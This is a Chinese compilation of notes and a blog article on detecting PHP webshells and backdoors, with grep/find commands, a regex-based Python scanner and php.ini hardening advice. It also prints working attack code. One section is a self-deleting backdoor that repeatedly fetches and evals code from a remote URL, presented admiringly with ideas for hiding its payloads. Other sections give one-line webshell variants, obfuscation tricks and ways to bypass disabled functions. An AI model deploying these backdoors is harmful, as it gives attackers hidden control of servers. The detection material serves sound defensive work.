* 寻找 PHP（网站）挂马，后门
一

php 后门木马常用的函数大致上可分为四种类型：



1. 执行系统命令: system, passthru, shell_exec, exec, popen, proc_open


2. 代码执行与加密: eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13


3. 文件包含与生成: require, require_once, include, include_once, file_get_contents, file_put_contents, fputs, fwrite


4. .htaccess: SetHandler, auto_prepend_file, auto_append_file


二

想找一个 关键词是“hellow word” 在哪些文件中有，我们用 grep 命令


grep --color -i -r -n "hellow word"  /data/www/

这样就能搜索出来 文件中包含关键词的文件

--color 是关键词标红

-i 是不区分大小写
-r 是包含子目录的搜索
-d skip 忽略子目录

可以用以上命令查找网站项目里的带有挂马的文件


三

.两个查后门的实用 linux 命令：
find /data/web/website/ -iname *.php -mtime -35 找出/data/web/website/目录下 35 分钟前新建的 php
find /data/web/website/ -name “*.php” | xargs grep “eval($_POST[” 找出/data/web/website/ 里面源码包含 eval($_POST[的 php 文件  (注意：POST 后面可能需要转义符“\”，否则有可能不能执行）

四.

例如

注入漏洞 eval(base64_decode

grep --color -i -r -n "eval"  /data/www/   找出来对比以前正常的代码，看是否正常。然后用 stat 查看这个木马文件的修改时间，最后去寻找 WEB 日志，找出木马从哪里进来的

eg: grep --color -i -r -n 'eval($_POST'  cncar/ 


五：

实用查找 PHP 木马命令：

查找 PHP 木马

# find ./ -name "*.php" |xargs egrep "phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decoolcode|spider_bc"> /tmp/php.txt
 
# grep -r --include=*.php  '[^a-z]eval($_POST' . > /tmp/eval.txt
 
# grep -r --include=*.php  'file_put_contents(.*$_POST
.∗
);' . > /tmp/file_put_contents.txt
 
# find ./ -name "*.php" -type f -print0 | xargs -0 egrep "(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decoolcode|eval\(base64_decoolcode|spider_bc|gzinflate)" | awk -F: '{print $1}' | sort | uniq
查找最近一天被修改的 PHP 文件

#   find -mtime -1 -type f -name \*.php
修改网站的权限

# find -type f -name \*.php -exec chmod 444 {} \;
 
# find ./ -type d -exec chmod 555{} \;


假设最后更新是 10 天前我们可以查找 10 天内生成的可以 php 文件:

find /var/www/ -name “*.php” -mtime -10

也可以通过关键字的形式查找 常见的木马常用代码函数 eval,shell_exec,passthru,popen,system

find /var/www/ -name “*.php” |xargs grep “eval” |more
find /var/www/ -name “*.php” |xargs grep “shell_exec” |more
find /var/www/ -name “*.php” |xargs grep “passthru” |more

还有查看 access.log 当然前提是你网站的所有 php 文件不是很多的情况下

一句话查找 PHP 木马
# find ./ -name “*.php” |xargs egrep “phpspy|c99sh|milw0rm|eval(gunerpress|eval(base64_decode|spider_bc”> /tmp/php.txt
# grep -r –include=*.php ’[^a-z]eval($_POST’ . > /tmp/eval.txt
# grep -r –include=*.php ’file_put_contents(.*$_POST[.*]);’ . > /tmp/file_put_contents.txt
# find ./ -name “*.php” -type f -print0 | xargs -0 egrep “(phpspy|c99sh|milw0rm|eval(gzuncompress(base64_decode|eval(base64_decode|spider_bc|gzinflate)” | awk -F: ‘{print $1}’ | sort | uniq
查找最近一天被修改的 PHP 文件
# find -mtime -1 -type f -name *.php

六

以下其实是多余的操作了其实，但是还是有值得看的地方


，检查代码。

肯定不是一个文件一个文件的检查，Linxu 有强悍的命令

grep ‘eval’ * -R 全盘搜索当前目录所有文件（包含子目录）中带有 eval 的文件，这条可以快速查找到被挂马的文件。

关于 eval，请自行 google 一句话 php 代码。

2，查看日志。

不到这个时候不知道日志的可贵啊。

还是以 grep 命令为主。

思路：负责的站点是 Linux，只开了 2 个端口，一个 22 和 80，外部的执行命令是由从 80 端口进来，Selinux 报 httpd 访问/boot 文件，确认被挂马。而所有的命令执行必须 POST 提交给执行的文件。所以，查找日志中所有的 POST 记录。

cat access_log_20120823.log | grep ‘POST’ | grep -v ‘反向查找’ | less，通过 grep -v 排除正常 post，egrep 也支持正则，但是太复杂了，看懂不知道怎么运用。

（这里不建议用 cat，用 tail 可以追加一个文件来看）
这可以防患于未然，防止不知道哪天又被人黑进来了。每天看一眼日志。

3，对于网页目录，只给 apache 用户 rx 权限，不要给 w 权限，目录设置要加上 rx，不要给 w，个别文件除外。所以，配合 2 使用，Linux 下可以快速过滤刷选出来不规则的 POST 请求。

综合 1，2 其实就可以快速查找被黑的页面，被修改的文件替换干净的代码。

* 捡了一个非常淫荡的 PHP 后门，给跪了
  <?php

unlink($_SERVER['SCRIPT_FILENAME']);

ignore_user_abort(true);

set_time_limit(0);

$remote_file = 'http://xxx/xxx.txt';

while($code = file_get_contents($remote_file)){

@eval($code);

sleep(5);

};

?>

后门的代码第一行删除自身，然后驻留在后台内存里（关于 ignore_user_abort 函数，百度一下），等待外部链接

在 xxx.txt 中写入你的后门代码，访问后就会删除自己并循环执行 txt 的代码 


例如 txt 里面写了一句这样的代码 file_put_contents('./1.php',"<?php @eval($_POST[cmd])'"?>");


这样就会在目录下又生成一个木马


如果对方写了是执行命令 。。。

这段代码纯粹变成了一个等待命令的木马。。


而且管理员检查木马文件的时候  都找不到。。。


因为文件已经删除了



木马却注入在 php-fpm 内


sleep(5);  五秒就去远程读取一下指令。。。

........

打算将代码修改一下，加一些正则，去 163 某一篇新闻的评论里读取预先设定的恶意代码。。。hehe。。。


黑客连服务器都省了。。。



黑客只需要去网易新闻评论窗口内写入自己的代码就行


怕别人看懂？


直接加密


采用对称加密算法。。没有秘钥 谁也看不懂啥意思


秘钥在这段后门里面写着


所以非常安全



活生生就是一个远控木马啊！！

这么好的思路，给作者一个大赞

* 如何查找 php 木马后门高级篇

jusker (爱好后门后门分析) | 2014-05-17 11:54

<?php eval($_POST[xiao])?> # 在正常的编程中 eval 不常见，可通过字符串匹配查找 eval

常见的是变成

base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz4=) #同样匹配这个 base64_decode，找到文件之后查看文件内容

这种形式可以绕过，另外还有其他形式

<?php $_GET['eval']($_POST['xiao']);?>#同样这断你可以如果一个文件中出现 eval，或者文件中同时出现$_GET $_POST 则输出文

件位置

if(key($_GET)=='singyea')call_user_func($_GET['singyea'],$_POST['singyea'])；

<?php $_GET['a']($_POST['b']);?> #这几种就比较猥琐

test.php?a=assert

密码 b

<?php assert($_POST[s]);?>#直接匹配 assert

<?php $_POST['iso']($_POST['cmd']);?>#匹配文件中同时拥有两个 POST 的直接输出文件位置

密码 cmd 菜刀配置信息填:<O>iso=assert</O

preg_replace("/[pageerror]/e",$_POST['error'],"saft"); #这种就是同时一个文件里有 preg_replace 跟 POST 直接输出文件位置然后手工查找

@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null); 与上面一样的匹配方式

<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?

$s = create_function('', $_REQUEST['c']);

$s();

// s.php?c=eval%28$_REQUEST[cmd]%29;&cmd=echo%201;

?>

<?php file_put_contents(base64_decode(文件名), base64_decode(小马 base64));?>

对于 webshell 的一句话查杀只需要找到以上基本就可以解决

然后对于大马来说有 fread,fwrite,mkdir,system,eval，basename 一些函数，可查 php filesystem 函数，如果有这个函数匹配是否存可以代码

最后一个就是查找 fsocket 跟 socket 函数

这个是用来查打流量的函数 ddos 之类


* [[https://www.cnblogs.com/chenpingzhao/p/6562415.html][PHP安全之webshell和后门检测 - 踏雪无痕SS - 博客园]] :website:

** Article

基于 PHP 的应用面临着各种各样的攻击：

-  XSS：对 PHP 的 Web 应用而言，跨站脚本是一个易受攻击的点。攻击者可以利用它盗取用户信息。你可以配置 Apache，或是写更安全的 PHP 代码（验证所有用户输入）来防范 XSS 攻击

-  SQL 注入：这是 PHP 应用中，数据库层的易受攻击点。防范方式同上。常用的方法是，使用 mysql\_real\_escape\_string()对参数进行转义，而后进行 SQL 查询。

-   *文件上传*：它可以让访问者在服务器上放置（即上传）文件。这会造成例如，删除服务器文件、数据库，获取用户信息等一系列问题。你可以使用 PHP 来禁止文件上传，或编写更安全的代码（如检验用户输入，只允许上传 png、gif 这些图片格式）

-   *包含本地与远程文件*：攻击者可以使远程服务器打开文件，运行任何 PHP 代码，然后上传或删除文件，安装后门。可以通过取消远程文件执行的设置来防范

-   *eval/assert*：这个函数可以使一段字符串如同 PHP 代码一样执行。它通常被攻击者用于在服务器上隐藏代码和工具。通过配置 PHP，取消 eval 等函数调用来实现

-  Sea-surt Attack（Cross-site request forgery，CSRF。跨站请求伪造）：这种攻击会使终端用户在当前账号下执行非指定行为。这会危害终端用户的数据与操作安全。如果目标终端用户的账号用于管理员权限，整个 Web 应用都会收到威胁。

这里介绍上述加粗的几种攻击的方法

*** 一、各种 webshell


随着业务量的增大，越来越多的黑客来攻击扫描，网站安全性日益重要，一不留神就被黑客控制了服务器，最常见的方式就是通过 POST 请求来上传木马文件，从而达到可以执行任意命令，如果被控制就大事不妙了

所以还是要正视服务器的安全

最流行的一种后门叫做一句话木马，其形式如下所示：

#+BEGIN_EXAMPLE
#+END_EXAMPLE

这种容易被安全软件检测出来。为了增强隐蔽性，出现了各种一句话木马的变形，通过各种函数来伪装， *这里不得不吐槽 PHP 弱类型对于安全来说是致命的*

**** a、使用 str\_replace 函数


#+BEGIN_EXAMPLE

    //说明：请求参数  ?code=fputs(fopen(base64_decode(J2MucGhwJw==),w),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="))
    最终执行命令")）?>
#+END_EXAMPLE

**** b、使用 str\_rot13 函数


#+BEGIN_EXAMPLE
    //说明：首先，将eval函数用str_rot13('riny')隐藏。然后，利用 e 修饰符，在preg_replace完成字符串替换后，使得引擎将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。
#+END_EXAMPLE

**** c、使用 include 函数


#+BEGIN_EXAMPLE

    //由于include方法可以直接编译任何格式的文件为php格式运行，因此可以上传一个txt格式的php文件，将真正的后门写在文本当中。
#+END_EXAMPLE

**** d、使用 pack 函数


#+BEGIN_EXAMPLE
#+END_EXAMPLE

*** e、使用 session


#+BEGIN_EXAMPLE

     f、隐藏在html页面
     
     

    404 Not Found

    Not Found
    The requested URL was not found on this server.

#+END_EXAMPLE

**** g、使用 assert 函数


#+BEGIN_EXAMPLE
#+END_EXAMPLE

**** 或者


#+BEGIN_EXAMPLE

     h、使用copy函数复制文件
     
     

     二、代码混淆
     
      
#+END_EXAMPLE

或者

#+BEGIN_EXAMPLE
#+END_EXAMPLE

可以使用 weevely 工具来生成，代码伪装避开各种主流的杀毒软件

#+BEGIN_QUOTE
  PHP 后门生成工具 weevely

  weevely 是一款针对 PHP 的 webshell 的自由软件，可用于模拟一个类似于 telnet 的连接 shell，weevely 通常用于 web 程序的漏洞利用，隐藏后门或者使用类似 telnet 的方式来代替 web 页面式的管理，weevely 生成的服务器端 php 代码是经过了 base64 编码的，所以可以骗过主流的杀毒软件和 IDS，上传服务器端代码后通常可以通过 weevely 直接运行。

  weevely 所生成的 PHP 后门所使用的方法是现在比较主流的 base64 加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的 eval，system 等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的 Web 后门查杀工具进行扫描，结果显示该文件无任何威胁。
#+END_QUOTE

更常用的混淆视听的方法:（这种是服务器层面的混淆）

-  修改文件时间

-  改名融入上传后所在文件夹，让人无法直观看出文件异常

-  文件大小的伪装处理(至少看起大小像个正常脚本)

-  选好藏身路径并尽量少的访问

-  畸形目录%20

*** 三、如果绕过配置文件


一般的服务器管理员会把 system、exec 等危险函数禁用的，那么如何绕过呢？

*** 1、使用反射


相关内容可参考： [[http://cn2.php.net/manual/en/reflectionfunction.invokeargs.php]]。

#+BEGIN_EXAMPLE
    invokeArgs(array("$_GET[c]"));
    ?>
#+END_EXAMPLE

**** 2、使用 callback


php 提供的另外一种可间接调用函数的方法是 callback. 这里使用了 ob\_start.具体说明可参考：http://www.php.net/manual/en/function.ob-start.php

#+BEGIN_EXAMPLE
#+END_EXAMPLE

php 中支持 callback 的函数还有很多，比如 array\_map,array\_filter, array\_reduce,usort(),uksort(),array\_walk() 等

*** 四、安全人员应该怎么做


*** 1、如何查找


直观寻找方式也有很多

-  通过文件名/修改时间/大小，文件备份比对发现异常（SVN/Git 对比，查看文件是否被修改）

-  通过 WEBSHELL 后门扫描脚本发现，如 Scanbackdoor.php/Pecker/shelldetect.php/（zhujiweishi ）

-  通过 access.log 访问日志分析

下面是 360 zhujiweishi ，在 linux 服务器上非常简单好用

[[https://images2015.cnblogs.com/blog/268981/201703/268981-20170317102649479-757410709.jpg]]

通过常见的关键词如（可以使用 find 和 grep 等命令结合起来搜索代码中是否包含以下文件）

-  系统命令执行: system, passthru, shell\_exec, exec, popen, proc\_open

-  代码执行: eval, assert, call\_user\_func,base64\_decode, gzinflate, gzuncompress, gzdecode, str\_rot13

-  文件包含: require, require\_once, include, include\_once, file\_get\_contents, file\_put\_contents, fputs, fwrite

通过简单的 python 脚本

#+BEGIN_EXAMPLE
    #!/usr/bin/env python
    # encoding: utf-8
     
    import os,sys
    import re
    import hashlib
    import time
     
    rulelist = [
        '(\$_(GET|POST|REQUEST)\[.{0,15}\]\s{0,10}\(\s{0,10}\$_(GET|POST|REQUEST)\[.{0,15}\]\))',
        '((eval|assert)(\s|\n)*\((\s|\n)*\$_(POST|GET|REQUEST)\[.{0,15}\]\))',
        '(eval(\s|\n)*\(base64_decode(\s|\n)*\((.|\n){1,200})',
        '(function\_exists\s*\(\s*[\'|\"](popen|exec|proc\_open|passthru)+[\'|\"]\s*\))',
        '((exec|shell\_exec|passthru)+\s*\(\s*\$\_(\w+)\[(.*)\]\s*\))',
        '(\$(\w+)\s*\(\s.chr\(\d+\)\))',
        '(\$(\w+)\s*\$\{(.*)\})',
        '(\$(\w+)\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\s*\))',
        '(\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\(\s*\$(.*)\))',
        '(\$\_\=(.*)\$\_)',
        '(\$(.*)\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\))',
        '(new com\s*\(\s*[\'|\"]shell(.*)[\'|\"]\s*\))',
        '(echo\s*curl\_exec\s*\(\s*\$(\w+)\s*\))',
        '((fopen|fwrite|fputs|file\_put\_contents)+\s*\((.*)\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\](.*)\))',
        '(\(\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$\_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\))',
        '(\$\_(\w+)(.*)(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*\$(\w+)\s*\))',
        '((include|require|include\_once|require\_once)+\s*\(\s*[\'|\"](\w+)\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\'|\"]\s*\))',
        '(eval\s*\(\s*\(\s*\$\$(\w+))',
        '((eval|assert|include|require|include\_once|require\_once|array\_map|array\_walk)+\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\))',
        '(preg\_replace\s*\((.*)\(base64\_decode\(\$)'
        ]
     
    def scan(path):
        print('           可疑文件         ')
        print('*'*30)
        for root,dirs,files in os.walk(path):
            for filespath in files:
                if os.path.getsize(os.path.join(root,filespath))<1024000:
                    file= open(os.path.join(root,filespath))
                    filestr = file.read()
                    file.close()
                    for rule in rulelist:
                        result = re.compile(rule).findall(filestr)
                        if result:
                            print '文件:'+os.path.join(root,filespath )
                            print '恶意代码:'+str(result[0][0:200])
                            print ('最后修改时间:'+time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(os.path.getmtime(os.path.join(root,filespath)))))
                            print '\n\n'
                            break
    def md5sum(md5_file):
        m = hashlib.md5()
        fp = open(md5_file)
        m.update(fp.read())
        return m.hexdigest()
        fp.close()
     
    if md5sum('/etc/issue') == '3e3c7c4194b12af573ab11c16990c477':
        if md5sum('/usr/sbin/sshd') == 'abf7a90c36705ef679298a44af80b10b':
            pass
        else:
            print('*'*40)
            print "\033[31m sshd被修改，疑似留有后门\033[m"
            print('*'*40)
            time.sleep(5)
    if md5sum('/etc/issue') == '6c9222ee501323045d85545853ebea55':
        if md5sum('/usr/sbin/sshd') == '4bbf2b12d6b7f234fa01b23dc9822838':
            pass
        else:
            print('*'*40)
            print "\033[31m sshd被修改，疑似留有后门\033[m"
            print('*'*40)
            time.sleep(5)
    if __name__=='__main__':
     
        if len(sys.argv)!=2:
            print '参数错误'
            print "\t按恶意代码查找:"+sys.argv[0]+'目录名'
        if os.path.lexists(sys.argv[1]) == False:
            print "目录不存在"
            exit()
        print ('\n\n开始查找:'+sys.argv[1])
        if len(sys.argv) ==2:
            scan(sys.argv[1])
        else:
            exit()
#+END_EXAMPLE

**** 2、如何防范


**** php.ini 设置


-  disable\_functions =phpinfo,passthru,exec,system,chroot,scandir,chgrp,chown,shell\_exec,proc\_open,proc\_get\_status,ini\_alter,ini\_alter,ini\_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream\_socket\_server,get\_current\_user,leak,putenv,popen,opendir

-  设置“safe\_mode”为“on”

-  禁止“open\_basedir” 可以禁止指定目录之外的文件操作

-  expose\_php 设为 off 这样 php 不会在 http 文件头中泄露信息

-  设置“allow\_url\_fopen”为“off” 可禁止远程文件功能

-  log\_errors”设为“on” 错误日志开启

**** php 编码方面


-  所有用户提交的信息 post get 或是其他形式提交的数据 都要单独写个过滤函数处理一遍，养成习惯(intval，strip\_tags，mysql\_real\_escape\_string)

-  经常检查有没有一句话木马 eval($\_POST[ 全站搜索 php 代码有没有这样的源代码

-  文件要命名规范 至少让自己可以一目了然，哪些 php 文件名字有问题

-  如用开源代码，有补丁出来的话，尽快打上补丁

-  如果攻击者拿到了服务器的最高权限，有可能通过修改服务器的配置文件 php.ini 来达到他们隐藏后门的目的，前几年比较流行。原理如下：php.ini 里面的这两个配置项：auto\_prepend\_file ，auto\_append\_file 可以让 php 解析前，自己加点东西进去 Automatically add files before or after any PHP document,如果被配置了 eval()函数的后门 那就很阴险了，php 文件代码里面查不出，只会在 php 解析前包含 eval()函数进来 并且因为是全局的 所以所有 php 页面都是后门！所以要先确认 auto\_prepend\_file ，auto\_append\_file 没被配置成其他东西，才进行第 3 点的源代码检查。

**** 服务器配置


配置的时候尽量使用最小权限，不要写入或者执行的目录不能给相应的权限

nginx 或者 apache 配置的时候，不能访问的目录一定要配置为 deny

待续。。。

参考文章

https://github.com/chenpingzhao/php-webshells

http://blog.csdn.net/miltonzhong/article/details/9714367

http://blog.jobbole.com/53821/
